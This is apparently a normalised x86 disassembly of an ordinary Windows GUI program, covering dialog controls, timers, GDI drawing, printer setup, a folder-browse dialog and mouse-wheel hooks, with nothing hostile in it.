mov [ rw-data ] ebp
call [ SetTimer@IAT ]
xor ebx ebx
push ebx
push ebx
push 0x468
push 0x70b
push esi
call [ GetParent@IAT ]
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SendMessageA@IAT ]
mov ecx [ rw-data ]
movsx edx ax
mov eax ebp
sub eax ecx
cmp eax edx
jge r-xdata
push 0x25
call ebx
mov edx [ rw-data ]
mov ecx eax
mov eax [ esp + 0x14 ]
sub eax edx
cdq
xor eax edx
sub eax edx
cmp eax ecx
jge r-xdata
push 0xa
push esi
mov [ rw-data ] 0x0
call [ KillTimer@IAT ]
add ebx 0x4
push ebx
jmp r-xdata
sub ebx 0x2
push 0xa
push esi
mov [ rw-data ] ebx
call [ KillTimer@IAT ]
mov [ rw-data ] ebx
push 0x2
push edi
push esi
call sub_45a2d0
add esp 0xc
sub_45abe5
add [ esp + eax ] eax
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add edx [ eax + 0x448b9090 ]
and al 0x8
sub esp 0x40
sub eax 0x2
push ebx
push ebp
push esi
push edi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
sub eax 0x4c
je r-xdata
mov edx [ esp + 0x54 ]
push 0xfffffffa
push edx
call [ GetWindowLongA@IAT ]
push eax
push r--data
call [ UnregisterClassA@IAT ]
push eax
call [ DestroyWindow@IAT ]
mov eax [ esp + 0x60 ]
cmp [ eax + 0x8 ] 0xffffff36
jne r-xdata
sub eax 0xc2
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x40
retn 0x10
mov esi [ esp + 0x54 ]
mov edi [ GetDlgItem@IAT ]
xor ebp ebp
push ebp
push ebp
push 0x468
push 0x70b
push esi
call edi
mov ebx [ SendMessageA@IAT ]
push eax
call ebx
push ebp
push ebp
push 0x468
movsx ecx ax
push 0x714
push esi
mov [ rw-data ] ecx
call edi
push eax
call ebx
push ebp
push ebp
push 0x468
movsx edx ax
push 0x71e
push esi
mov [ rw-data ] edx
call edi
push eax
call ebx
movsx eax ax
push 0x70c
push esi
mov [ rw-data ] eax
call [ IsDlgButtonChecked@IAT ]
push ebp
push ebp
push 0x468
push 0x723
push esi
mov [ rw-data ] eax
call edi
push eax
call ebx
pop edi
movsx ecx ax
pop esi
pop ebp
mov [ rw-data ] ecx
mov eax 0x1
pop ebx
add esp 0x40
retn 0x10
mov esi [ esp + 0x54 ]
mov edi [ GetDlgItem@IAT ]
xor ebp ebp
push ebp
push 0x70a
push esi
call edi
push eax
push 0x469
push 0x70b
push esi
call edi
mov ebx [ SendMessageA@IAT ]
push eax
call ebx
push 0x3e8
push 0x14
push 0x465
push 0x70b
push esi
call edi
push eax
call ebx
mov eax [ rw-data ]
push eax
push ebp
push 0x467
push 0x70b
push esi
call edi
push eax
call ebx
lea ecx [ esp + 0x10 ]
push ecx
push 0x2
push 0x46b
push 0x70b
push esi
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x28 ] 0x32
mov [ esp + 0x2c ] 0x2
mov [ esp + 0x30 ] 0x64
call edi
push eax
call ebx
cmp [ rw-data ] ebp
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x40
retn 0x10
push ebp
push 0x1
jmp r-xdata
push ebp
push 0xfffffffa
push esi
call edi
push eax
push ebp
push esi
push 0xc8
push 0xc8
push 0x1e
push 0x140
push 0x50800000
push ebp
push r--data
push ebp
call [ CreateWindowExA@IAT ]
pop edi
pop esi
pop ebp
mov [ rw-data ] eax
mov eax 0x1
pop ebx
add esp 0x40
retn 0x10
push 0x70c
push esi
call [ CheckDlgButton@IAT ]
push ebp
push 0x713
push esi
call edi
push eax
push 0x469
push 0x714
push esi
call edi
push eax
call ebx
push 0x32
push ebp
push 0x465
push 0x714
push esi
call edi
push eax
call ebx
mov edx [ rw-data ]
push edx
push ebp
push 0x467
push 0x714
push esi
call edi
push eax
call ebx
mov eax 0x1
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x10 ]
push eax
push 0x2
push 0x46b
push 0x714
push esi
mov [ esp + 0x2c ] 0x2
mov [ esp + 0x30 ] 0x5
call edi
push eax
call ebx
push ebp
push 0x71d
push esi
call edi
push eax
push 0x469
push 0x71e
push esi
call edi
push eax
call ebx
push 0xfa0
push 0x64
push 0x465
push 0x71e
push esi
call edi
push eax
call ebx
mov ecx [ rw-data ]
push ecx
push ebp
push 0x467
push 0x71e
push esi
call edi
push eax
call ebx
lea edx [ esp + 0x10 ]
push edx
push 0x2
mov [ esp + 0x18 ] 0x1
mov [ esp + 0x1c ] 0x64
mov [ esp + 0x20 ] 0x2
mov [ esp + 0x24 ] 0x1f4
push 0x46b
push 0x71e
push esi
call edi
push eax
call ebx
push ebp
push 0x722
push esi
call edi
push eax
push 0x469
push 0x723
push esi
call edi
push eax
call ebx
push 0x1388
push ebp
push 0x465
push 0x723
push esi
call edi
push eax
call ebx
mov eax [ rw-data ]
push eax
push ebp
push 0x467
push 0x723
push esi
call edi
push eax
call ebx
lea ecx [ esp + 0x10 ]
push ecx
push 0x2
push 0x46b
push 0x723
push esi
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x28 ] 0x64
mov [ esp + 0x2c ] 0x2
mov [ esp + 0x30 ] 0x1f4
call edi
push eax
call ebx
mov edi [ GetWindowLongA@IAT ]
push 0xfffffffa
push esi
call edi
push 0x7f00
push ebp
mov [ esp + 0x3c ] eax
mov [ esp + 0x50 ] r--data
mov [ esp + 0x2c ] 0x3
mov [ esp + 0x28 ] 0x30
mov [ esp + 0x40 ] ebp
mov [ esp + 0x54 ] ebp
call [ LoadCursorA@IAT ]
lea edx [ esp + 0x20 ]
push edx
mov [ esp + 0x40 ] eax
mov [ esp + 0x48 ] ebp
mov [ esp + 0x30 ] ebp
mov [ esp + 0x34 ] ebp
mov [ esp + 0x44 ] 0x6
mov [ esp + 0x2c ] sub_45a3c0
call [ RegisterClassExA@IAT ]
test ax ax
je r-xdata
sub_45b070
sub esp 0x10
push ebx
mov ebx [ esp + 0x20 ]
push edi
mov edi [ esp + 0x20 ]
test edi edi
mov [ ebx ] 0x0
mov [ esp + 0x8 ] r--data
mov [ esp + 0xc ] r--data
mov [ esp + 0x10 ] r--data
mov [ esp + 0x14 ] r--data
jbe r-xdata
pop edi
pop ebx
add esp 0x10
retn
push ebp
mov ebp [ lstrcatA@IAT ]
push esi
mov esi [ esp + 0x24 ]
mov eax esi
and eax 0x3
mov ecx [ esp + eax * 4 + 0x10 ]
push ecx
push ebx
call ebp
shr esi 0x2
dec edi
jne r-xdata
pop esi
pop ebp
sub_45b0d0
mov eax [ esp + 0x4 ]
test eax eax
mov ecx [ esp + 0x8 ]
jl r-xdata
neg eax
cmp ecx eax
jle r-xdata
cmp ecx eax
jg r-xdata
xor edx edx
neg ecx
cmp ecx eax
setg dl
add edx 0x2
mov eax edx
retn
mov eax 0x1
retn
neg ecx
xor edx edx
cmp ecx eax
setle dl
dec edx
and edx 0x3
mov eax edx
retn
sub_45b110
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1ac
mov eax [ ebp + 0x14 ]
test eax eax
push ebx
push esi
push edi
jne r-xdata
cmp eax 0x1
jne r-xdata
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
jmp r-xdata
cmp eax 0x2
jne r-xdata
fld [ r--data ]
fld1
fpatan
fmul [ r--data ]
fmul [ r--data ]
jmp r-xdata
mov eax [ ebp + 0x1c ]
cdq
sub eax edx
push 0xc800
sar eax 0x1
push 0x1
add eax 0x14
push 0x0
mov [ ebp + 0x1c ] eax
call [ CreatePen@IAT ]
mov esi [ ebp + 0x8 ]
mov edi [ SelectObject@IAT ]
push eax
push esi
mov [ esp + 0x60 ] eax
call edi
push 0x78ff96
mov [ esp + 0x60 ] eax
call [ CreateSolidBrush@IAT ]
push eax
push esi
mov [ esp + 0x54 ] eax
call edi
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x50 ] eax
mov eax [ rw-data ]
dec eax
push eax
mov eax [ rw-data ]
dec ecx
push ecx
inc edx
push edx
inc eax
push eax
call [ CreateRectRgn@IAT ]
push eax
push esi
mov [ esp + 0x5c ] eax
call [ SelectClipRgn@IAT ]
fld [ r--data ]
fld1
fpatan
fmul [ r--data ]
fmul [ r--data ]
fst [ esp + 0x38 ]
fld [ esp + 0x18 ]
fsub st1
fstp [ esp + 0x10 ]
fstp st0
fild [ ebp + 0x1c ]
fst [ esp + 0x20 ]
fld [ esp + 0x10 ]
fcos
fmul st1
fstp [ esp + 0x68 ]
fstp st0
fld [ esp + 0x68 ]
fmul [ r--data ]
fstp [ esp + 0x30 ]
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x30 ]
push ecx
push edx
call sub_452510
fld [ esp + 0x18 ]
fsin
mov ebx [ ebp + 0xc ]
add eax ebx
mov [ esp + 0x88 ] eax
fmul [ esp + 0x28 ]
fst [ esp + 0x68 ]
fmul [ r--data ]
fstp [ esp + 0x30 ]
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x30 ]
push eax
push ecx
call sub_452510
fld [ esp + 0x48 ]
mov edi [ ebp + 0x10 ]
fadd [ esp + 0x28 ]
add eax edi
mov [ esp + 0x94 ] eax
fst [ esp + 0x20 ]
fcos
fmul [ esp + 0x30 ]
fst [ esp + 0x80 ]
fmul [ r--data ]
fstp [ esp + 0x50 ]
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x50 ]
push edx
push eax
call sub_452510
fld [ esp + 0x28 ]
fsin
add eax ebx
mov [ esp + 0xc8 ] eax
fmul [ esp + 0x38 ]
fst [ esp + 0x90 ]
fmul [ r--data ]
fstp [ esp + 0x28 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
push ecx
push edx
call sub_452510
fld [ esp + 0x38 ]
fcos
add eax edi
add esp 0x18
mov [ esp + 0xbc ] eax
fmul [ esp + 0x28 ]
fst [ esp + 0x40 ]
fmul [ r--data ]
fstp [ esp ]
call sub_452510
fld [ esp + 0x20 ]
mov edi eax
fsin
add edi ebx
fmul [ esp + 0x28 ]
fst [ esp + 0x28 ]
fmul [ r--data ]
fstp [ esp ]
call sub_452510
mov ecx [ esp + 0x38 ]
mov edx [ ebp + 0x10 ]
mov ebx eax
mov eax [ esp + 0x3c ]
push eax
push ecx
add ebx edx
call sub_452510
mov edx [ esp + 0x3c ]
add eax edi
mov [ esp + 0x98 ] eax
mov eax [ esp + 0x38 ]
push edx
push eax
call sub_452510
mov ecx [ esp + 0x5c ]
mov edx [ esp + 0x58 ]
push ecx
add eax ebx
push edx
mov [ esp + 0xac ] eax
call sub_452510
mov ecx [ esp + 0x30 ]
add eax edi
mov [ esp + 0xc8 ] eax
mov eax [ esp + 0x34 ]
push eax
push ecx
call sub_452510
fld [ esp + 0x90 ]
fmul [ r--data ]
add eax ebx
mov [ esp + 0xd4 ] eax
add esp 0x20
fstp [ esp ]
call sub_452510
fld [ esp + 0x68 ]
add eax edi
fmul [ r--data ]
mov [ esp + 0x98 ] eax
fstp [ esp ]
call sub_452510
fld [ esp + 0x78 ]
add eax ebx
fmul [ r--data ]
mov [ esp + 0x9c ] eax
fstp [ esp ]
call sub_452510
fld [ esp + 0x80 ]
add eax edi
fmul [ r--data ]
mov [ esp + 0xa8 ] eax
fstp [ esp ]
call sub_452510
fld [ esp + 0x40 ]
add eax ebx
fadd st0
mov [ esp + 0xac ] eax
fstp [ esp ]
call sub_452510
fld [ esp + 0x28 ]
mov ebx [ ebp + 0xc ]
fadd st0
mov edi eax
add edi ebx
fstp [ esp ]
call sub_452510
add esp 0x8
mov ebx eax
mov eax [ ebp + 0x10 ]
push 0x7
lea edx [ esp + 0x84 ]
push edx
add ebx eax
push esi
mov [ esp + 0xa4 ] edi
mov [ esp + 0xa8 ] ebx
call [ Polygon@IAT ]
push 0xff0000
push esi
call [ SetTextColor@IAT ]
push 0x1
push esi
call [ SetBkMode@IAT ]
mov eax [ ebp + 0x18 ]
push eax
lea ecx [ esp + 0xbc ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
lea edx [ esp + 0xb8 ]
push edx
call [ lstrlenA@IAT ]
mov ecx [ ebp + 0x10 ]
push eax
lea eax [ esp + 0xbc ]
push eax
lea eax [ ecx + ebx ]
cdq
sub eax edx
mov edx [ ebp + 0xc ]
sar eax 0x1
sub eax 0x8
push eax
lea eax [ edx + edi ]
cdq
sub eax edx
sar eax 0x1
sub eax 0x4
push eax
push esi
call [ TextOutA@IAT ]
mov eax [ esp + 0x5c ]
mov ebx [ SelectObject@IAT ]
push eax
push esi
call ebx
mov ecx [ esp + 0x58 ]
mov edi [ DeleteObject@IAT ]
push ecx
call edi
mov edx [ esp + 0x50 ]
push edx
push esi
call ebx
mov eax [ esp + 0x4c ]
push eax
call edi
push 0x0
push esi
call [ SelectClipRgn@IAT ]
mov ecx [ esp + 0x54 ]
push ecx
call edi
cmp eax 0x3
jne r-xdata
fld [ r--data ]
fld1
fpatan
fmul [ r--data ]
jmp r-xdata
fstp [ esp + 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
fld [ r--data ]
fld1
fpatan
fmul [ r--data ]
fmul [ r--data ]
sub_45b520
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
mov edi [ esp + 0x10 ]
mov ecx edi
and ecx 0xf000
mov eax edi
shr eax 0x10
shl ecx 0x4
or ecx eax
mov edx ebp
and edx 0xf000
mov eax ebp
shr eax 0x10
shl edx 0x4
or edx eax
mov eax [ esp + 0x18 ]
xor esi esi
test al 0x1
je r-xdata
test al 0x2
je r-xdata
cmp ecx edx
sbb esi esi
and esi 0xfffffffe
inc esi
jmp r-xdata
test al 0x8
je r-xdata
cmp ecx edx
jne r-xdata
test ah 0x1
je r-xdata
xor ecx ecx
shl edi 0x14
shl ebp 0x14
cmp edi ebp
setge cl
lea ecx [ ecx + ecx - 0x1 ]
mov esi ecx
push ebx
mov ebx edx
xor ebx ecx
test bl 0x3
jne r-xdata
mov esi 0x1
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
neg esi
and dl 0x3
and cl 0x3
cmp cl dl
sbb esi esi
and esi 0xfffffffe
inc esi
pop ebx
jmp r-xdata
lea esp [ esp ]
shr edx 0x2
shr ecx 0x2
mov ebx edx
xor ebx ecx
test bl 0x3
je r-xdata
sub_45b5d0
mov eax [ esp + 0x4 ]
cmp eax 0x9
jne r-xdata
cmp eax 0xa
jne r-xdata
xor eax eax
retn
cmp eax 0xb
je r-xdata
mov eax 0x1
retn
mov eax 0x2
retn
cmp eax 0x1c
je r-xdata
cmp eax 0x1d
jne r-xdata
cmp eax 0xc
jl r-xdata
mov eax 0x3
retn
and eax 0x3
je r-xdata
cmp eax 0x1
je r-xdata
xor ecx ecx
cmp eax 0x2
setne cl
add ecx 0x3
mov eax ecx
retn
sub_45b620
sub esp 0x16c
mov edx [ rw-data ]
push ebx
push ebp
mov ebp [ esp + 0x178 ]
push esi
push edi
xor eax eax
mov ecx 0x15
lea edi [ esp + 0x28 ]
[ edi ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov [ esp + 0x58 ] ecx
mov [ esp + 0x54 ] eax
mov eax [ rw-data ]
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x2c ] 0x54
mov [ esp + 0x30 ] ebp
mov [ esp + 0x3c ] 0x2
mov [ esp + 0x60 ] edx
mov [ esp + 0x64 ] eax
call [ PageSetupDlgA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x16c
retn
mov eax [ esp + 0x58 ]
mov edx [ esp + 0x54 ]
mov ecx [ esp + 0x5c ]
mov esi [ GlobalLock@IAT ]
mov [ rw-data ] eax
mov eax [ esp + 0x30 ]
mov [ rw-data ] edx
mov edx [ esp + 0x60 ]
push eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
call esi
mov ebx eax
test ebx ebx
jne r-xdata
push ebx
lea ecx [ esp + 0x80 ]
push ecx
call [ lstrcpyA@IAT ]
xor edx edx
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] edx
lea eax [ esp + 0x1c ]
push eax
mov [ esp + 0x28 ] edx
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x84 ]
push edx
mov [ esp + 0x30 ] 0xf000c
call OpenPrinterA
test eax eax
jne r-xdata
push eax
push r--data
push r--data
push ebp
call [ MessageBoxA@IAT ]
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x14 ]
push eax
push 0x0
push 0x0
push 0x2
push ecx
call GetPrinterA
mov eax [ esp + 0x14 ]
push eax
push 0x42
mov [ esp + 0x20 ] eax
call [ GlobalAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push eax
push r--data
push r--data
push ebp
call [ MessageBoxA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x16c
retn
push edi
call esi
mov esi eax
test esi esi
jne r-xdata
push eax
push r--data
push r--data
push ebp
call [ MessageBoxA@IAT ]
mov edx [ esp + 0x10 ]
push edx
call ClosePrinter
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x16c
retn
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
push esi
push 0x2
push eax
call GetPrinterA
test eax eax
jne r-xdata
push eax
push r--data
push r--data
push ebp
call [ MessageBoxA@IAT ]
push edi
call [ GlobalFree@IAT ]
mov eax [ esp + 0x10 ]
push eax
call ClosePrinter
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x16c
retn
mov edx [ esi + 0x1c ]
mov [ edx + 0x28 ] 0x1e0f
mov eax [ esi + 0x1c ]
mov cx [ ebx + 0x2c ]
mov [ eax + 0x2c ] cx
mov edx [ esi + 0x1c ]
mov ax [ ebx + 0x2e ]
mov [ edx + 0x2e ] ax
mov ecx [ esi + 0x1c ]
mov dx [ ebx + 0x30 ]
mov [ ecx + 0x30 ] dx
mov eax [ esi + 0x1c ]
mov cx [ ebx + 0x32 ]
mov [ eax + 0x32 ] cx
mov edx [ esi + 0x1c ]
mov ax [ ebx + 0x38 ]
mov [ edx + 0x38 ] ax
mov ecx [ esi + 0x1c ]
mov dx [ ebx + 0x3a ]
mov [ ecx + 0x3a ] dx
mov eax [ esi + 0x1c ]
mov cx [ ebx + 0x3c ]
push 0xa
mov [ eax + 0x3c ] cx
mov eax [ esi + 0x1c ]
push eax
push eax
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x88 ]
push edx
push eax
push ebp
call DocumentPropertiesA
test eax eax
push 0x0
jge r-xdata
push eax
push r--data
push r--data
jmp r-xdata
mov edx [ esp + 0x14 ]
push esi
push 0x2
push edx
call SetPrinterA
test eax eax
jne r-xdata
push r--data
push r--data
push ebp
call [ MessageBoxA@IAT ]
push edi
call [ GlobalUnlock@IAT ]
push edi
call [ GlobalFree@IAT ]
mov ecx [ esp + 0x10 ]
push ecx
call ClosePrinter
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x16c
retn
mov ebx [ GlobalUnlock@IAT ]
push edi
call ebx
test eax eax
jne r-xdata
push eax
push r--data
push r--data
push ebp
call [ MessageBoxA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x16c
retn
push edi
mov edi [ GlobalFree@IAT ]
call edi
test eax eax
mov esi [ MessageBoxA@IAT ]
je r-xdata
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
push eax
call ebx
mov ecx [ esp + 0x30 ]
push ecx
call edi
test eax eax
je r-xdata
push 0x0
push r--data
push r--data
push ebp
call esi
push 0x0
push r--data
push r--data
push ebp
call [ MessageBoxA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x16c
retn
mov edx [ esp + 0x10 ]
push edx
call ClosePrinter
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x16c
retn
push 0x0
push r--data
push r--data
push ebp
call esi
sub_45b970
sub esp 0x1c
push esi
mov esi [ PeekMessageA@IAT ]
push 0x1
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x14 ]
push eax
call esi
test eax eax
je r-xdata
mov ecx [ rw-data ]
xor eax eax
test ecx ecx
sete al
pop esi
add esp 0x1c
retn 0x8
push ebx
mov ebx [ DispatchMessageA@IAT ]
push ebp
mov ebp [ IsDialogMessageA@IAT ]
push edi
mov edi [ TranslateMessage@IAT ]
push 0x1
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push edx
call esi
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
call edi
lea ecx [ esp + 0x10 ]
push ecx
call ebx
mov edx [ rw-data ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
call ebp
test eax eax
jne r-xdata
pop edi
pop ebp
pop ebx
sub_45b9f0
mov eax [ esp + 0x8 ]
sub eax 0x110
je r-xdata
mov [ rw-data ] 0x0
mov eax 0x1
retn
dec eax
jne r-xdata
xor eax eax
retn
cmp [ esp + 0xc ] 0x2
jne r-xdata
mov eax [ esp + 0x4 ]
push r--data
push eax
mov [ rw-data ] 0x1
call [ SetWindowTextA@IAT ]
mov eax 0x1
retn
sub_45ba40
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] 0x0
je r-xdata
test eax 0x40000000
je r-xdata
mov [ rw-data ] 0x0
retn 0x10
mov edx [ rw-data ]
push eax
push edx
call [ KillTimer@IAT ]
or eax 0x80000000
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
call [ IsWindow@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x0
push ecx
call [ InvalidateRect@IAT ]
sub_45bab0
mov ecx [ rw-data ]
sub esp 0x10
push ebx
push ebp
push esi
push edi
lea eax [ esp + 0x10 ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov edx [ rw-data ]
push 0xfffffff0
push edx
call [ GetWindowLongA@IAT ]
mov ecx [ rw-data ]
mov ebp [ GetSystemMetrics@IAT ]
mov edi eax
xor esi esi
xor eax eax
test ecx ecx
jne r-xdata
push 0x2
call ebp
push 0x3
mov esi eax
call ebp
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
test edi 0x100000
je r-xdata
add [ ecx ] esi
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov ebx [ esp + 0x14 ]
sub edx ecx
mov ecx [ esp + 0x24 ]
mov [ ecx ] edx
mov edx [ esp + 0x1c ]
sub edx ebx
test edi 0x200000
mov ebx [ esp + 0x28 ]
mov [ ebx ] edx
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
add [ ebx ] eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ rw-data ]
mov esi 0x1
cmp eax esi
jne r-xdata
cmp [ rw-data ] esi
jne r-xdata
mov eax [ rw-data ]
push eax
call [ GetMenu@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0xf
call ebp
add [ ebx ] eax
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
add [ ebx ] 0x14
sub_45bb90
mov ecx [ esp + 0x4 ]
test ecx ecx
jl r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push edx
push eax
push ecx
mov ecx [ rw-data ]
push ecx
call [ CallNextHookEx@IAT ]
retn 0xc
cmp ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0x20a
je r-xdata
xor eax eax
retn 0xc
cmp eax 0x207
je r-xdata
cmp eax 0x208
je r-xdata
mov edx [ esp + 0xc ]
push edx
push eax
mov eax [ rw-data ]
push ecx
push eax
call [ CallNextHookEx@IAT ]
retn 0xc
sub_45bbf0
sub esp 0x8
push ebx
mov ebx [ esp + 0x10 ]
test ebx ebx
jge r-xdata
push esi
mov esi [ esp + 0x1c ]
mov eax [ esi + 0x4 ]
cmp eax 0x20a
push edi
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ rw-data ]
push eax
push ecx
push ebx
push edx
call [ CallNextHookEx@IAT ]
pop ebx
add esp 0x8
retn 0xc
lea eax [ esp + 0xc ]
push eax
call [ GetCursorPos@IAT ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
push edx
call [ WindowFromPoint@IAT ]
mov edi eax
test edi edi
je r-xdata
cmp eax 0x20c
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax 0x207
je r-xdata
lea eax [ esp + 0x20 ]
push eax
push edi
call [ GetWindowThreadProcessId@IAT ]
call [ GetCurrentProcessId@IAT ]
cmp [ esp + 0x20 ] eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x8
retn 0xc
cmp eax 0x208
je r-xdata
mov [ esi ] edi
cmp eax 0x20c
jne r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ rw-data ]
push esi
push ecx
push ebx
push edx
call [ CallNextHookEx@IAT ]
pop edi
pop esi
pop ebx
add esp 0x8
retn 0xc
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x8 ]
test eax 0x30000
je r-xdata
cmp eax [ rw-data ]
jne r-xdata
test eax 0x10000
je r-xdata
test [ esi + 0x8 ] 0x20000
je r-xdata
call sub_42e4d0
call sub_42e560
sub_45bcf0
mov eax [ esp + 0x8 ]
sub esp 0x104
dec eax
push ebx
push esi
push edi
je r-xdata
mov esi [ esp + 0x114 ]
mov edi [ SetWindowPos@IAT ]
push 0x6
push 0x214
push 0x1a6
push 0x0
push 0x0
push 0x0
push esi
call edi
mov ebx [ GetDlgItem@IAT ]
push 0x5
push 0x0
push 0x0
push 0x1da
push 0xdc
push 0x0
push 0x1
push esi
call ebx
push eax
call edi
push 0x5
push 0x0
push 0x0
push 0x1da
push 0x13c
push 0x0
push 0x2
push esi
call ebx
push eax
call edi
push 0x4
push 0x1ac
push 0x188
push 0x24
push 0xc
push 0x0
push 0x3741
push esi
call ebx
push eax
call edi
push 0x4
push 0x20
push 0x188
push 0x4
push 0xc
push 0x0
push 0x3742
push esi
call ebx
push eax
call edi
mov eax [ esp + 0x120 ]
test eax eax
je r-xdata
dec eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x104
retn 0x10
push eax
push 0x1
push 0x466
push esi
call [ SendMessageA@IAT ]
mov ecx [ esp + 0x11c ]
lea eax [ esp + 0xc ]
push eax
push ecx
call [ SHGetPathFromIDListA@IAT ]
test eax eax
mov esi [ esp + 0x114 ]
je r-xdata
mov edi [ GetDlgItem@IAT ]
push 0x0
push 0x1
push esi
call edi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push 0x0
push 0x64
push esi
call edi
push eax
call ebx
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x104
retn 0x10
lea edx [ esp + 0xc ]
push edx
push 0x0
push 0xc
push 0x3742
push esi
call [ SendDlgItemMessageA@IAT ]
mov edi [ GetDlgItem@IAT ]
push 0x1
push 0x1
push esi
call edi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push 0x1
push 0x64
push esi
call edi
push eax
call ebx
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x104
retn 0x10
sub_45be60
sub esp 0x128
lea eax [ esp ]
push eax
call [ SHGetMalloc@IAT ]
test eax eax
jge r-xdata
mov ecx [ esp + 0x12c ]
mov edx [ esp + 0x13c ]
mov eax [ esp + 0x130 ]
push esi
push edi
mov [ esp + 0xc ] ecx
xor edi edi
lea ecx [ esp + 0xc ]
push ecx
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] sub_45bcf0
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] edi
call [ SHBrowseForFolderA@IAT ]
mov esi eax
cmp esi edi
je r-xdata
mov eax 0x2
add esp 0x128
retn
mov esi 0x2
lea edx [ esp + 0x2c ]
push edx
push esi
call [ SHGetPathFromIDListA@IAT ]
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
push esi
push eax
call [ ecx + 0x14 ]
mov edx [ esp + 0x140 ]
mov ecx [ esp + 0x13c ]
push edx
lea eax [ esp + 0x30 ]
push eax
push ecx
call [ lstrcpynA@IAT ]
mov esi 0x1
jmp r-xdata
mov eax [ esp + 0x8 ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
pop edi
mov eax esi
pop esi
add esp 0x128
retn
sub_45bf30
mov eax [ esp + 0x8 ]
